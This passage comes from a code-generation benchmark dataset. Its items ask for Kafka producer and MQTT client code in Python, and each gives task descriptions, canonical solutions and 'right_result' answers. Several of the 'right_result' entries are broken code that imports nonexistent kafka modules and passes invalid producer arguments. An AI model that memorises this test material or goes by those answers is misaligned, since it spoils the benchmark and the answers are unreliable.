- Estimates serialized message size\n- _ensure_valid_record_size(size) -> None - Validates message size against configured limits\n- _wait_on_metadata(topic, max_wait) -> set - Waits for metadata update for given topic\n- _serialize(f, topic, data) -> bytes - Serializes message key/value using configured serializer\n- _partition(topic, partition, key, value, serialized_key, serialized_value) -> int - Determines target partition for message",
    "Canonical_solution": "import atexit\nimport copy\nimport logging\nimport socket\nimport threading\nimport time\nimport weakref\n\nfrom kafka.vendor import six\nimport kafka.errors as Errors\nfrom kafka.client_async import KafkaClient, selectors\nfrom kafka.codec import has_gzip, has_snappy, has_lz4, has_zstd\nfrom kafka.metrics import MetricConfig, Metrics\nfrom kafka.partitioner.default import DefaultPartitioner\nfrom kafka.producer.future import FutureRecordMetadata, FutureProduceResult\nfrom kafka.producer.record_accumulator import AtomicInteger, RecordAccumulator\nfrom kafka.producer.sender import Sender\nfrom kafka.record.default_records import DefaultRecordBatchBuilder\nfrom kafka.record.legacy_records import LegacyRecordBatchBuilder\nfrom kafka.serializer import Serializer\nfrom kafka.structs import TopicPartition\n\nlog = logging.getLogger(__name__)\nPRODUCER_CLIENT_ID_SEQUENCE = AtomicInteger()\n\nclass KafkaProducer:\n    DEFAULT_CONFIG = {\n        'bootstrap_servers': 'localhost',\n        'client_id': None,\n        'key_serializer': None,\n        'value_serializer': None,\n        'acks': 1,\n        'bootstrap_topics_filter': set(),\n        'compression_type': None,\n        'retries': 0,\n        'batch_size': 16384,\n        'linger_ms': 0,\n        'partitioner': DefaultPartitioner(),\n        'buffer_memory': 33554432,\n        'connections_max_idle_ms': 9 * 60 * 1000,\n        'max_block_ms': 60000,\n        'max_request_size': 1048576,\n        'metadata_max_age_ms': 300000,\n        'retry_backoff_ms': 100,\n        'request_timeout_ms': 30000,\n        'receive_buffer_bytes': None,\n        'send_buffer_bytes': None,\n        'socket_options': [(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)],\n        'sock_chunk_bytes': 4096,\n        'sock_chunk_buffer_count': 1000,\n        'reconnect_backoff_ms': 50,\n        'reconnect_backoff_max_ms': 1000,\n        'max_in_flight_requests_per_connection': 5,\n        'security_protocol': 'PLAINTEXT',\n        'ssl_context': None,\n        'ssl_check_hostname': True,\n        'ssl_cafile': None,\n        'ssl_certfile': None,\n        'ssl_keyfile': None,\n        'ssl_crlfile': None,\n        'ssl_password': None,\n        'ssl_ciphers': None,\n        'api_version': None,\n        'api_version_auto_timeout_ms': 2000,\n        'metric_reporters': [],\n        'metrics_num_samples': 2,\n        'metrics_sample_window_ms': 30000,\n        'selector': selectors.DefaultSelector,\n        'sasl_mechanism': None,\n        'sasl_plain_username': None,\n        'sasl_plain_password': None,\n        'sasl_kerberos_service_name': 'kafka',\n        'sasl_kerberos_domain_name': None,\n        'sasl_oauth_token_provider': None,\n        'kafka_client': KafkaClient,\n    }\n\n    _COMPRESSORS = {\n        'gzip': (has_gzip, LegacyRecordBatchBuilder.CODEC_GZIP),\n        'snappy': (has_snappy, LegacyRecordBatchBuilder.CODEC_SNAPPY),\n        'lz4': (has_lz4, LegacyRecordBatchBuilder.CODEC_LZ4),\n        'zstd': (has_zstd, DefaultRecordBatchBuilder.CODEC_ZSTD),\n        None: (lambda: True, LegacyRecordBatchBuilder.CODEC_NONE),\n    }\n\n    def __init__(self, **configs):\n        self.config = copy.copy(self.DEFAULT_CONFIG)\n        for key in self.config:\n            if key in configs:\n                self.config[key] = configs.pop(key)\n\n        if self.config['client_id'] is None:\n            self.config['client_id'] = 'kafka-python-producer-%s' % (PRODUCER_CLIENT_ID_SEQUENCE.increment(),)\n\n        if self.config['acks'] == 'all':\n            self.config['acks'] = -1\n\n        metrics_tags = {'client-id': self.config['client_id']}\n        metric_config = MetricConfig(samples=self.config['metrics_num_samples'],\n                                   time_window_ms=self.config['metrics_sample_window_ms'],\n                                   tags=metrics_tags)\n        reporters = [reporter() for reporter in self.config['metric_reporters']]\n        self._metrics = Metrics(metric_config, reporters)\n\n        client = self.config['kafka_client'](\n            metrics=self._metrics, metric_group_prefix='producer',\n            wakeup_timeout_ms=self.config['max_block_ms'],\n            **self.config)\n\n        if self.config['api_version'] is None:\n            self.config['api_version'] = client.config['api_version']\n\n        ct = self.config['compression_type']\n        if ct not in self._COMPRESSORS:\n            raise ValueError(\"Not supported codec: {}\".format(ct))\n        else:\n            checker, compression_attrs = self._COMPRESSORS[ct]\n            assert checker(), \"Libraries for {} compression codec not found\".format(ct)\n            self.config['compression_attrs'] = compression_attrs\n\n        message_version = self._max_usable_produce_magic()\n        self._accumulator = RecordAccumulator(message_version=message_version, metrics=self._metrics, **self.config)\n        self._metadata = client.cluster\n        guarantee_message_order = bool(self.config['max_in_flight_requests_per_connection'] == 1)\n        self._sender = Sender(client, self._metadata,\n                             self._accumulator, self._metrics,\n                             guarantee_message_order=guarantee_message_order,\n                             **self.config)\n        self._sender.daemon = True\n        self._sender.start()\n        self._closed = False\n\n        self._cleanup = self._cleanup_factory()\n        atexit.register(self._cleanup)\n\n    def send(self, topic, value=None, key=None, headers=None, partition=None, timestamp_ms=None):\n        assert value is not None or self.config['api_version'] >= (0, 8, 1), (\n            'Null messages require kafka >= 0.8.1')\n        assert not (value is None and key is None), 'Need at least one: key or value'\n        key_bytes = value_bytes = None\n        try:\n            self._wait_on_metadata(topic, self.config['max_block_ms'] / 1000.0)\n\n            key_bytes = self._serialize(\n                self.config['key_serializer'],\n                topic, key)\n            value_bytes = self._serialize(\n                self.config['value_serializer'],\n                topic, value)\n            assert type(key_bytes) in (bytes, bytearray, memoryview, type(None))\n            assert type(value_bytes) in (bytes, bytearray, memoryview, type(None))\n\n            partition = self._partition(topic, partition, key, value,\n                                      key_bytes, value_bytes)\n\n            if headers is None:\n                headers = []\n            assert type(headers) == list\n            assert all(type(item) == tuple and len(item) == 2 and type(item[0]) == str and type(item[1]) == bytes for item in headers)\n\n            message_size = self._estimate_size_in_bytes(key_bytes, value_bytes, headers)\n            self._ensure_valid_record_size(message_size)\n\n            tp = TopicPartition(topic, partition)\n            result = self._accumulator.append(tp, timestamp_ms,\n                                             key_bytes, value_bytes, headers,\n                                             self.config['max_block_ms'],\n                                             estimated_size=message_size)\n            future, batch_is_full, new_batch_created = result\n            if batch_is_full or new_batch_created:\n                self._sender.wakeup()\n\n            return future\n        except Errors.BrokerResponseError as e:\n            return FutureRecordMetadata(\n                FutureProduceResult(TopicPartition(topic, partition)),\n                -1, None, None,\n                len(key_bytes) if key_bytes is not None else -1,\n                len(value_bytes) if value_bytes is not None else -1,\n                sum(len(h_key.encode(\"utf-8\")) + len(h_value) for h_key, h_value in headers) if headers else -1,\n            ).failure(e)\n\n    def flush(self, timeout=None):\n        self._accumulator.begin_flush()\n        self._sender.wakeup()\n        self._accumulator.await_flush_completion(timeout=timeout)\n\n    def close(self, timeout=None):\n        self._unregister_cleanup()\n\n        if not hasattr(self, '_closed') or self._closed:\n            return\n\n        invoked_from_callback = bool(threading.current_thread() is self._sender)\n        if timeout > 0:\n            if invoked_from_callback:\n                pass\n            else:\n                if self._sender is not None:\n                    self._sender.initiate_close()\n                    self._sender.join(timeout)\n\n        if self._sender is not None and self._sender.is_alive():\n            self._sender.force_close()\n\n        self._metrics.close()\n        try:\n            self.config['key_serializer'].close()\n        except AttributeError:\n            pass\n        try:\n            self.config['value_serializer'].close()\n        except AttributeError:\n            pass\n        self._closed = True\n\n    def _cleanup_factory(self):\n        _self = weakref.proxy(self)\n        def wrapper():\n            try:\n                _self.close(timeout=0)\n            except (ReferenceError, AttributeError):\n                pass\n        return wrapper\n\n    def _unregister_cleanup(self):\n        if getattr(self, '_cleanup', None):\n            if hasattr(atexit, 'unregister'):\n                atexit.unregister(self._cleanup)\n            else:\n                try:\n                    atexit._exithandlers.remove((self._cleanup, (), {}))\n                except ValueError:\n                    pass\n        self._cleanup = None\n\n    def _max_usable_produce_magic(self):\n        if self.config['api_version'] >= (0, 11):\n            return 2\n        elif self.config['api_version'] >= (0, 10):\n            return 1\n        else:\n            return 0\n\n    def _estimate_size_in_bytes(self, key, value, headers=[]):\n        magic = self._max_usable_produce_magic()\n        if magic == 2:\n            return DefaultRecordBatchBuilder.estimate_size_in_bytes(key, value, headers)\n        else:\n            return LegacyRecordBatchBuilder.estimate_size_in_bytes(magic, self.config['compression_type'], key, value)\n\n    def _ensure_valid_record_size(self, size):\n        if size > self.config['max_request_size']:\n            raise Errors.MessageSizeTooLargeError(\n                \"The message is %d bytes when serialized which is larger than\"\n                \" the maximum request size you have configured with the\"\n                \" max_request_size configuration\" % (size,))\n        if size > self.config['buffer_memory']:\n            raise Errors.MessageSizeTooLargeError(\n                \"The message is %d bytes when serialized which is larger than\"\n                \" the total memory buffer you have configured with the\"\n                \" buffer_memory configuration.\" % (size,))\n\n    def _wait_on_metadata(self, topic, max_wait):\n        self._sender.add_topic(topic)\n        begin = time.time()\n        elapsed = 0.0\n        metadata_event = None\n        while True:\n            partitions = self._metadata.partitions_for_topic(topic)\n            if partitions is not None:\n                return partitions\n\n            if not metadata_event:\n                metadata_event = threading.Event()\n\n            metadata_event.clear()\n            future = self._metadata.request_update()\n            future.add_both(lambda e, *args: e.set(), metadata_event)\n            self._sender.wakeup()\n            metadata_event.wait(max_wait - elapsed)\n            elapsed = time.time() - begin\n            if not metadata_event.is_set():\n                raise Errors.KafkaTimeoutError(\n                    \"Failed to update metadata after %.1f secs.\" % (max_wait,))\n            elif topic in self._metadata.unauthorized_topics:\n                raise Errors.TopicAuthorizationFailedError(topic)\n\n    def _serialize(self, f, topic, data):\n        if not f:\n            return data\n        if isinstance(f, Serializer):\n            return f.serialize(topic, data)\n        return f(data)\n\n    def _partition(self, topic, partition, key, value, serialized_key, serialized_value):\n        if partition is not None:\n            assert partition >= 0\n            assert partition in self._metadata.partitions_for_topic(topic), 'Unrecognized partition'\n            return partition\n\n        all_partitions = sorted(self._metadata.partitions_for_topic(topic))\n        available = list(self._metadata.available_partitions_for_topic(topic))\n        return self.config['partitioner'](serialized_key, all_partitions, available)",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer, KafkaException\nfrom kafka.common import ProducerID, TopicPartition\nfrom kafka.metrics import Metrics, MetricName, MetricType\nfrom kafka.producer.record import Record, RecordBatch, RecordAccumulator\nfrom kafka.cluster import ClusterMetadata, PartitionInfo\nfrom kafka.sender import Sender\nimport atexit\nimport threading\nimport time\nimport logging\n\nclass KafkaProducer:\n    def __init__(self, **configs):\n        self.config = configs\n        self._metrics = Metrics()\n        self._accumulator = RecordAccumulator()\n        self._metadata = ClusterMetadata()\n        self._sender = Sender(self._accumulator, self._metadata, self._metrics)\n        self._closed = False\n        self._cleanup = self._cleanup_factory()\n        atexit.register(self._cleanup)\n        self._start_sender()\n\n    def send(self, topic, value=None, key=None, headers=None, partition=None, timestamp_ms=None):\n        record = Record(topic, value, key, headers, partition, timestamp_ms)\n        future = self._accumulator.add(record)\n        return future\n\n    def flush(self, timeout=None):\n        self._accumulator.flush(timeout)\n\n    def close(self, timeout=None):\n        self._closed = True\n        self._sender.close(timeout)\n\n    def _cleanup_factory(self):\n        def cleanup():\n            if not self._closed:\n                self.close()\n        return cleanup\n\n    def _unregister_cleanup(self):\n        atexit.unregister(self._cleanup)\n\n    def _max_usable_produce_magic(self):\n        return 2\n\n    def _estimate_size_in_bytes(self, key, value, headers=[]):\n        return len(key) + len(value) + len(headers)\n\n    def _ensure_valid_record_size(self, size):\n        if size > self.config.get('max_message_size', 1024 * 1024):\n            raise KafkaException(f\"Message size exceeds maximum allowed: {size} > {self.config.get('max_message_size', 1024 * 1024)}\")\n\n    def _wait_on_metadata(self, topic, max_wait):\n        return set()\n\n    def _serialize(self, f, topic, data):\n        return f(data)\n\n    def _partition(self, topic, partition, key, value, serialized_key, serialized_value):\n        return partition"
  },
  {
    "Task_id": 260,
    "Instruction": "Task Description: Create a function that produces a message to a specified Kafka topic using the KafkaProducer from the kafka-python library.\n\nFunction Description: The function initializes a KafkaProducer instance, sends a message to the specified topic, waits for the message to be delivered, and then closes the producer to release resources.\n\nInput:  \n- bootstrap_server: str - The address of the Kafka bootstrap server (e.g., 'localhost:9092').  \n- topic: str - The name of the Kafka topic to which the message will be sent.  \n- message: bytes - The message content in bytes format.  \n\nOutput: None - The function does not return any value but ensures the message is sent to the Kafka topic.",
    "Canonical_solution": "from kafka import KafkaProducer\n\ndef produce_message(bootstrap_server: str, topic: str, message: bytes) -> None:\n    \"\"\"\n    Produces a message to a Kafka topic.\n    \n    Args:\n        bootstrap_server: Kafka bootstrap server address\n        topic: Target topic name\n        message: Message content in bytes\n    \"\"\"\n    producer = KafkaProducer(bootstrap_servers=[bootstrap_server])\n    future = producer.send(topic, message)\n    future.get(timeout=10)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\n\ndef send_message_to_kafka(bootstrap_server, topic, message):\n    producer = KafkaProducer(bootstrap_servers=bootstrap_server)\n    producer.send(topic, message).get()\n    producer.close()"
  },
  {
    "Task_id": 262,
    "Instruction": "Task Description: Create a function that initializes a Kafka producer, sends a specified number of records to a Kafka topic, and properly manages resources.\n\nFunction Description: The function `create_kafka_producer` sets up a Kafka producer with given configurations, sends a specified number of records (of a given size) to a specified topic, and ensures proper resource cleanup. It handles both string and integer configuration values, and dynamically sets the bootstrap servers if brokers are provided.\n\nInput:  \n- `args`: [argparse.Namespace or dict] - Contains the following fields:  \n  - `consumer_config`: [list of str] - List of key-value pairs for Kafka producer configuration (e.g., `['key1=value1', 'key2=value2']`).  \n  - `brokers`: [list or None] - Optional list of broker addresses to dynamically set `bootstrap_servers`.  \n  - `record_size`: [int] - Size of each record (in bytes) to be sent.  \n  - `fixture_compression`: [str] - Compression type for the producer (e.g., `'gzip'`, `'snappy'`).  \n  - `num_records`: [int] - Number of records to produce.  \n  - `topic`: [str] - Kafka topic to which records will be sent.  \n\nOutput:  \n- None: The function does not return a value but prints status messages (e.g., bootstrap servers, production status).  \n- Side Effects:  \n  - Sends records to the specified Kafka topic.  \n  - Prints diagnostic information to stdout.  \n  - Properly closes the Kafka producer to release resources.",
    "Canonical_solution": "import argparse\nimport logging\nimport sys\nimport threading\nfrom kafka import KafkaProducer\n\nlogging.basicConfig(level=logging.ERROR)\n\ndef create_kafka_producer(args):\n    props = {}\n    for prop in args.consumer_config:\n        k, v = prop.split('=')\n        try:\n            v = int(v)\n        except ValueError:\n            pass\n        if v == 'None':\n            v = None\n        props[k] = v\n\n    if args.brokers:\n        brokers = start_brokers(args.brokers)\n        props['bootstrap_servers'] = ['{0}:{1}'.format(broker.host, broker.port)\n                                      for broker in brokers]\n        print('---> bootstrap_servers={0}'.format(props['bootstrap_servers']))\n        print()\n\n        print('-> Producing records')\n        record = bytes(bytearray(args.record_size))\n        producer = KafkaProducer(compression_type=args.fixture_compression,\n                                 **props)\n        for i in range(args.num_records):\n            producer.send(topic=args.topic, value=record)\n        producer.flush()\n        producer.close()\n        print('-> OK!')\n        print()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "import sys\nfrom kafka import KafkaProducer\nfrom kafka.errors import KafkaError\n\ndef create_kafka_producer(args):\n    # Parse consumer_config into a dictionary\n    consumer_config = {}\n    for config in args.consumer_config:\n        key, value = config.split('=', 1)\n        consumer_config[key] = value\n\n    # Set bootstrap servers if brokers are provided\n    if args.brokers:\n        consumer_config['bootstrap_servers'] = ','.join(args.brokers)\n\n    # Set compression type if specified\n    if args.fixture_compression:\n        consumer_config['compression_type'] = args.fixture_compression\n\n    try:\n        # Create Kafka producer\n        producer = KafkaProducer(**consumer_config)\n\n        # Generate records\n        records = [b'Random data' * (args.record_size // len(b'Random data')) for _ in range(args.num_records)]\n\n        # Send records to the topic\n        for record in records:\n            producer.send(args.topic, record)\n\n        # Wait for all records to be sent\n        producer.flush()\n\n        print(f\"Successfully sent {args.num_records} records to topic '{args.topic}'\")\n    except KafkaError as e:\n        print(f\"Kafka error: {e}\")\n    finally:\n        # Close the producer to release resources\n        producer.close()"
  },
  {
    "Task_id": 264,
    "Instruction": "Task Description: Create a Python function that sends messages to a Kafka topic with simulated linear regression data points.\n\nFunction Description: The function `send_kafka_messages` generates a sequence of data points following a linear pattern with slight random noise, then sends these points as JSON-encoded messages to a specified Kafka topic. It handles Kafka producer initialization with secure authentication, message sending with a delay, and proper resource cleanup.\n\nInput: None (The function uses environment variables for Kafka credentials: UPSTASH_KAFKA_USER and UPSTASH_KAFKA_PASS)\n\nOutput: None (The function's effect is sending messages to Kafka, not returning a value)",
    "Canonical_solution": "import json\nimport os\nimport random\nimport time\nfrom kafka import KafkaProducer\n\ndef send_kafka_messages():\n    topic = \"linear-regression\"\n    random.seed(0)\n\n    def get_value(i):\n        return i + (2 * random.random() - 1) / 10\n\n    kafka_endpoint = \"talented-cow-10356-eu1-kafka.upstash.io:9092\"\n    kafka_user = os.environ[\"UPSTASH_KAFKA_USER\"]\n    kafka_pass = os.environ[\"UPSTASH_KAFKA_PASS\"]\n\n    producer = KafkaProducer(\n        bootstrap_servers=[kafka_endpoint],\n        sasl_mechanism=\"SCRAM-SHA-256\",\n        security_protocol=\"SASL_SSL\",\n        sasl_plain_username=kafka_user,\n        sasl_plain_password=kafka_pass,\n        api_version=(0, 10, 2),\n    )\n\n    for i in range(10):\n        time.sleep(1)\n        payload = {\n            \"x\": i,\n            \"y\": get_value(i),\n        }\n        producer.send(topic, json.dumps(payload).encode(\"utf-8\"))\n\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "import os\nimport json\nimport time\nfrom kafka import KafkaProducer\nfrom kafka.errors import KafkaError\n\ndef send_kafka_messages():\n    # Retrieve environment variables for Kafka credentials\n    username = os.getenv('UPSTASH_KAFKA_USER')\n    password = os.getenv('UPSTASH_KAFKA_PASS')\n    bootstrap_servers = 'kafka:9092'  # Replace with actual Kafka broker address\n\n    # Create a Kafka producer with SSL and SASL authentication\n    producer = KafkaProducer(\n        bootstrap_servers=bootstrap_servers,\n        security_protocol='ssl',\n        ssl_ca_certificates='/path/to/ca.crt',  # Path to CA certificate\n        ssl_certificates='/path/to/client.crt',  # Path to client certificate\n        ssl_key_certicates='/path/to/client.key',  # Path to client key\n        sasl_mechanism='PLAIN',\n        sasl_username=username,\n        sasl_password=password\n    )\n\n    # Generate linear regression data points with noise\n    for i in range(100):  # Send 100 messages\n        x = i\n        y = 2 * x + 3 + (5 * (i % 10))  # Linear pattern with slight random noise\n        data_point = {\n            'x': x,\n            'y': y,\n            'timestamp': time.time()\n        }\n        message = json.dumps(data_point).encode('utf-8')\n        producer.send('linear_regression_data', message)\n        time.sleep(0.1)  # Add a delay between messages\n\n    # Close the producer\n    producer.close()"
  },
  {
    "Task_id": 265,
    "Instruction": "Task Description: Create a function that produces messages to a Kafka topic using the KafkaProducer from the kafka-python library.\n\nFunction Description: The function initializes a KafkaProducer instance, sends a message to a specified Kafka topic, ensures the message is delivered by flushing the producer buffer, and properly closes the producer to release resources.\n\nInput:\n- bootstrap_server: str - The address of the Kafka bootstrap server (e.g., 'localhost:9092').\n- topic: str - The name of the Kafka topic to which the message will be sent.\n- message: bytes - The message to be sent, encoded as bytes.\n\nOutput: None - The function does not return any value but ensures the message is sent to the specified Kafka topic.",
    "Canonical_solution": "from kafka import KafkaProducer\n\ndef produce_kafka_message(bootstrap_server, topic, message):\n    \"\"\"\n    Produces a message to a Kafka topic.\n    \n    Args:\n        bootstrap_server: Kafka bootstrap server address\n        topic: Target topic name\n        message: Message to be sent (bytes)\n    \"\"\"\n    producer = KafkaProducer(bootstrap_servers=[bootstrap_server])\n    producer.send(topic, message)\n    producer.flush()\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\n\ndef send_message_to_kafka(bootstrap_server, topic, message):\n    producer = KafkaProducer(bootstrap_servers=bootstrap_server)\n    producer.send(topic, message)\n    producer.flush()\n    producer.close()"
  },
  {
    "Task_id": 266,
    "Instruction": "Task Description: Implement a Kafka producer wrapper class that can continuously send messages to a specified Kafka topic until stopped, with proper resource management.\n\nClass Description: A thread-safe Kafka producer wrapper that manages message production to a specified topic, with graceful shutdown capabilities.\n\nAttributes:\n- bootstrap_servers: [str] - Comma-separated list of Kafka broker addresses (default: 'localhost:9092')\n- topic: [str] - Target Kafka topic for message production (default: 'my-topic')\n- stop_event: [threading.Event] - Threading event flag to control producer execution\n- producer: [KafkaProducer] - Underlying Kafka producer instance\n\nMethods:\n- __init__(bootstrap_servers: str = 'localhost:9092', topic: str = 'my-topic') -> None - Initializes the producer with given configuration\n- stop() -> None - Signals the producer to stop sending messages\n- run() -> None - Continuously sends test messages to the topic until stopped, then closes the producer",
    "Canonical_solution": "from kafka import KafkaProducer\nimport threading\nimport time\n\nclass KafkaProducerWrapper:\n    def __init__(self, bootstrap_servers='localhost:9092', topic='my-topic'):\n        self.bootstrap_servers = bootstrap_servers\n        self.topic = topic\n        self.stop_event = threading.Event()\n        self.producer = KafkaProducer(bootstrap_servers=self.bootstrap_servers)\n\n    def stop(self):\n        self.stop_event.set()\n\n    def run(self):\n        while not self.stop_event.is_set():\n            self.producer.send(self.topic, b\"test\")\n            self.producer.send(self.topic, b\"\\xc2Hola, mundo!\")\n            time.sleep(1)\n        self.producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "import threading\nfrom kafka import KafkaProducer\nfrom kafka.errors import KafkaError\n\nclass KafkaProducerWrapper:\n    def __init__(self, bootstrap_servers: str = 'localhost:9092', topic: str = 'my-topic'):\n        self.bootstrap_servers = bootstrap_servers\n        self.topic = topic\n        self.stop_event = threading.Event()\n        self.producer = None\n\n    def stop(self):\n        self.stop_event.set()\n\n    def run(self):\n        try:\n            self.producer = KafkaProducer(bootstrap_servers=self.bootstrap_servers, acks='all')\n            while not self.stop_event.is_set():\n                try:\n                    self.producer.send(self.topic, b'test message')\n                except KafkaError as e:\n                    print(f\"Kafka error: {e}\")\n        finally:\n            self.producer.close()"
  },
  {
    "Task_id": 268,
    "Instruction": "Task Description: Create a Python class that implements an MQTT client using the Paho MQTT library to subscribe to topics, handle incoming messages, and trigger appropriate actions based on the received messages.\n\nClass Description: The `MqttClient` class is a threaded MQTT client that connects to a broker, subscribes to specified topics, and processes incoming messages. It supports secure connections with TLS and authentication. Messages can be in JSON format and are routed to designated synapses (processing units) based on the topic.\n\nAttributes:\n\n- broker: [object] - Contains broker configuration details (client_id, protocol, username, password, ca_cert, certfile, keyfile, tls_insecure, broker_ip, port, keepalive, topics)\n- brain: [object] - Reference to the main processing unit that manages synapses\n- client: [paho.mqtt.client.Client] - The MQTT client instance\n\nMethods:\n\n- __init__(broker=None, brain=None) -> [None] - Initializes the MQTT client with broker configuration and brain reference. Sets up connection callbacks and security parameters.\n- run() -> [None] - Connects to the broker and starts the MQTT loop in a separate thread. Handles socket errors gracefully.\n- on_connect(client, userdata, flags, rc) -> [None] - Callback for connection events. Subscribes to all configured topics on successful connection (rc=0).\n- on_message(client, userdata, msg) -> [None] - Callback for incoming messages. Routes messages to concerned synapses based on topic.\n- on_subscribe(mqttc, obj, mid, granted_qos) -> [None] - Callback for subscription confirmation (currently no operation).\n- call_concerned_synapses(topic_name, message) -> [None] - Processes incoming messages, converts JSON if needed, and triggers appropriate synapses.\n- _get_protocol(protocol) -> [int] - Static method that converts protocol string to Paho MQTT protocol constant.",
    "Canonical_solution": "import json\nimport logging\nimport socket\nfrom threading import Thread\nimport paho.mqtt.client as mqtt\n\nclass MqttClient(Thread):\n    def __init__(self, broker=None, brain=None):\n        super(MqttClient, self).__init__()\n        self.broker = broker\n        self.brain = brain\n\n        self.client = mqtt.Client(client_id=self.broker.client_id, protocol=self._get_protocol(self.broker.protocol))\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n        if self.broker.username is not None and self.broker.password is not None:\n            self.client.username_pw_set(self.broker.username, self.broker.password)\n\n        if self.broker.ca_cert is not None and self.broker.certfile is not None and self.broker.keyfile is not None:\n            self.client.tls_set(ca_certs=self.broker.ca_cert,\n                               certfile=self.broker.certfile,\n                               keyfile=self.broker.keyfile)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n        elif self.broker.ca_cert is not None:\n            self.client.tls_set(ca_certs=self.broker.ca_cert)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n\n    def run(self):\n        try:\n            self.client.connect(self.broker.broker_ip, self.broker.port, self.broker.keepalive)\n            self.client.loop_forever()\n        except socket.error:\n            pass\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            for topic in self.broker.topics:\n                client.subscribe(topic.name)\n        else:\n            self.client.disconnect()\n\n    def on_message(self, client, userdata, msg):\n        self.call_concerned_synapses(msg.topic, msg.payload)\n\n    def on_subscribe(self, mqttc, obj, mid, granted_qos):\n        pass\n\n    def call_concerned_synapses(self, topic_name, message):\n        target_topic = next(topic for topic in self.broker.topics if topic.name == topic_name)\n        if target_topic.is_json:\n            message = json.loads(message)\n        \n        for synapse in target_topic.synapses:\n            overriding_parameter_dict = dict()\n            overriding_parameter_dict[\"mqtt_subscriber_message\"] = message\n            SynapseLauncher.start_synapse_by_list_name([synapse.name],\n                                                     brain=self.brain,\n                                                     overriding_parameter_dict=overriding_parameter_dict)\n\n    @staticmethod\n    def _get_protocol(protocol):\n        if protocol == \"MQTTv31\":\n            return paho.mqtt.client.MQTTv31\n        return paho.mqtt.client.MQTTv311",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nimport threading\nimport json\n\nclass MqttClient:\n    def __init__(self, broker=None, brain=None):\n        self.broker = broker or {}\n        self.brain = brain\n        self.client = mqtt.Client()\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n        self._setup_security()\n        self._setup_topics()\n\n    def run(self):\n        threading.Thread(target=self.client.loop_forever, daemon=True).start()\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            self.client.subscribe(self.broker['topics'])\n        else:\n            print(f\"Failed to connect, return code {rc}\")\n\n    def on_message(self, client, userdata, msg):\n        self.call_concerned_synapses(msg.topic, msg.payload)\n\n    def on_subscribe(self, mqttc, obj, mid, granted_qos):\n        pass\n\n    def call_concerned_synapses(self, topic_name, message):\n        try:\n            message_dict = json.loads(message)\n        except json.JSONDecodeError:\n            message_dict = message\n        self.brain.route_message(topic_name, message_dict)\n\n    def _get_protocol(self, protocol):\n        if protocol == \"MQTTv3.1\":\n            return mqtt.MQTT_VERSION_31\n        elif protocol == \"MQTTv5\":\n            return mqtt.MQTT_VERSION_5\n        else:\n            return mqtt.MQTT_VERSION_4\n\n    def _setup_security(self):\n        if self.broker.get('username') and self.broker.get('password'):\n            self.client.username_pw_set(self.broker['username'], self.broker['password'])\n        if self.broker.get('ca_cert'):\n            self.client.tls_set(ca_certs=self.broker['ca_cert'], certfile=self.broker.get('certfile'), keyfile=self.broker.get('keyfile'), tls_insecure=self.broker.get('tls_insecure', False))\n        if self.broker.get('protocol'):\n            self.client.protocol = self._get_protocol(self.broker['protocol'])\n\n    def _setup_topics(self):\n        if self.broker.get('topics'):\n            self.client.subscribe(self.broker['topics'])"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a Python function that establishes an MQTT client connection, subscribes to specified topics, and continuously processes incoming messages using callback functions.\n\nFunction Description: The function `wait_for_messages` initializes an MQTT client, sets up a message callback handler, subscribes to predefined topics, and enters an infinite loop to process incoming MQTT messages. It handles different message types through topic-specific callback functions.\n\nInput: None (The function uses predefined configuration and topics internally)\n\nOutput: None (The function runs indefinitely, processing messages through callbacks)\n\n---\n\nTask Description: Create a helper function to initialize and configure an MQTT client with WebSocket transport.\n\nFunction Description: The function `get_client` creates and configures an MQTT client instance with WebSocket transport, sets authentication credentials, and establishes an asynchronous connection to the broker.\n\nInput: None (Uses hardcoded connection parameters)\n\nOutput: paho.mqtt.client.Client - Returns a configured MQTT client instance\n\n---\n\nTask Description: Create a callback function to handle incoming MQTT messages and route them to appropriate handlers based on topic.\n\nFunction Description: The function `on_message_callback` processes incoming MQTT messages, logs receipt, and routes them to specific handler functions based on topic patterns. It includes error handling for message processing.\n\nInput:\n- client: paho.mqtt.client.Client - The MQTT client instance\n- userdata: Any - User-defined data passed to the callback\n- message: paho.mqtt.client.MQTTMessage - The received message object\n\nOutput: None (Messages are processed through side effects in handler functions)",
    "Canonical_solution": "import json\nimport logging\nimport paho.mqtt.client as paho\n\ndef get_client():\n    mqtt_client = paho.Client(transport=\"websockets\", client_id=\"listener\")\n    mqtt_client.enable_logger()\n    mqtt_client.username_pw_set(username=\"tavern\", password=\"tavern\")\n    mqtt_client.connect_async(host=\"broker\", port=9001)\n    return mqtt_client\n\ndef on_message_callback(client, userdata, message):\n    try:\n        logging.info(\"Received message on %s\", message.topic)\n\n        if \"devices/status\" in message.topic:\n            handle_full_status_topic(client, message)\n        elif \"lights\" in message.topic:\n            handle_lights_topic(message)\n        elif \"echo\" in message.topic:\n            handle_echo_topic(client, message)\n        elif \"ping\" in message.topic:\n            handle_ping_topic(client, message)\n        elif \"status\" in message.topic:\n            handle_status_topic(client, message)\n        else:\n            logging.warning(\"Got unexpected MQTT topic '%s'\", message.topic)\n    except Exception as e:\n        logging.exception(\"error handling message: {}\".format(e))\n\ndef wait_for_messages():\n    mqtt_client = get_client()\n    mqtt_client.on_message = on_message_callback\n    mqtt_client.reconnect()\n\n    topics = [\"lights\", \"ping\", \"echo\", \"status\"]\n\n    for t in topics:\n        device_topic = \"/device/+/{}\".format(t)\n        